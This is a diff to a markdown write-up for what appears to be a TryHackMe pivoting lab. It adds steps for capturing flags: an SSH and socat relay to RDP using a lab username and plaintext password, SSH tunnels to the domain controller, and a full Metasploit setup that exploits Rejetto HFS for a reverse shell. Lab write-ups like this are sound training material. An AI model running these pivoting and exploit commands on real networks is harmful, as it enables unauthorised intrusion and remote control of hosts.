@@ -125,11 +125,58 @@ If we now want to execute any command through the proxy, we can use `proxychains
 
 **Note: nmap might not work well with SOCKS in some circumstances**
 
-## Flag
+## Flags
 
 * Connect to THMJMP2 via SSH using the credentials from the first task.
 * Connect via RDP to THMIIS using `socat`.
 * Exploit vulnerable Rejetto HFS on the Domain Controller.
+
+### RDP to THMIIS
+
+With the credentials from the distributor, ssh into the jumphost:
+
+    ssh username@za.tryhackme.com@thmjmp2@za.tryhackme.com
+
+On the jumphost, run socat:
+
+    C:\tools\socat\>socat TCP4-LISTEN:50000,fork TCP4:THMIIS.za.tryhackme.com:3389
+
+The firewall is disabled.
+
+Set up a listener on port 50000 on the attack machine, and connect to THMIIS via RDP from the attack machine by 
+pivoting through the listener at THMJMP2:
+    
+    xfreerdp /v:THMJMP2.za.tryhackme.com:13389 /u:t1_thomas.moore /p:MyPazzw3rd2020
+
+Flag is on desktop of t1_thomas.moore.
+
+### Exploit Rejetto HFS on the Domain Controller
+
+Use local port forwarding by adding `-L *:6666:127.0.0.1:6666` and `-L *:7777:127.0.0.1:7777` to the ssh command on 
+the jumphost THMJMP2. This will bind both ports on THMJMP2 and tunnel any connection back to the attack machine:
+
+    C:\> ssh tunneluser@<IP attack machine> -R 8888:thmdc.za.tryhackme.com:80 -L *:6666:127.0.0.1:6666 -L *:7777:127.0.0.1:7777 -N
+
+Start Metasploit and configure the exploit so that the required ports match the ports forwarded through THMJMP2:
+
+```text
+msfconsole
+msf6 > use rejetto_hfs_exec
+msf6 exploit(windows/http/rejetto_hfs_exec) > set payload windows/shell_reverse_tcp
+
+msf6 exploit(windows/http/rejetto_hfs_exec) > set lhost thmjmp2.za.tryhackme.com
+msf6 exploit(windows/http/rejetto_hfs_exec) > set ReverseListenerBindAddress 127.0.0.1
+msf6 exploit(windows/http/rejetto_hfs_exec) > set lport 7777
+
+msf6 exploit(windows/http/rejetto_hfs_exec) > set srvhost 127.0.0.1
+msf6 exploit(windows/http/rejetto_hfs_exec) > set srvport 6666
+
+msf6 exploit(windows/http/rejetto_hfs_exec) > set rhosts 127.0.0.1
+msf6 exploit(windows/http/rejetto_hfs_exec) > set rport 8888
+msf6 exploit(windows/http/rejetto_hfs_exec) > exploit
+```
+
+Receive a shell back at the attack machine. The flag is on `C:\hfs\flag.txt`.
 
 ## Resources
 
